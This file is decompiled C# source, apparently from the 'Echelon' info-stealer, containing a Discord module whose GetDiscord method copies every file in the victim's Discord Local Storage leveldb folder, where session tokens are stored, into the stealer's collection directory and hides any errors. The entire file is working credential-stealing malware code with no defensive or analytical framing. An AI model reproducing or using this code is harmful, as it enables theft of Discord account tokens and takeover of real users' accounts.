using System;
using System.IO;
using Echelon.Global;

namespace Echelon.Stealer.Discord
{
	// Token: 0x0200001E RID: 30
	internal class Discord
	{
		// Token: 0x06000054 RID: 84 RVA: 0x000050F0 File Offset: 0x000032F0
		public static void GetDiscord(string Echelon_Dir)
		{
			try
			{
				if (Directory.Exists(Help.AppDate + Discord.dir))
				{
					foreach (FileInfo fileInfo in new DirectoryInfo(Help.AppDate + Discord.dir).GetFiles())
					{
						Directory.CreateDirectory(Echelon_Dir + "\\Discord\\Local Storage\\leveldb\\");
						fileInfo.CopyTo(Echelon_Dir + "\\Discord\\Local Storage\\leveldb\\" + fileInfo.Name);
					}
					Discord.count++;
				}
			}
			catch
			{
			}
		}

		// Token: 0x0400003B RID: 59
		public static int count;

		// Token: 0x0400003C RID: 60
		public static string dir = "\\discord\\Local Storage\\leveldb\\";
	}
}
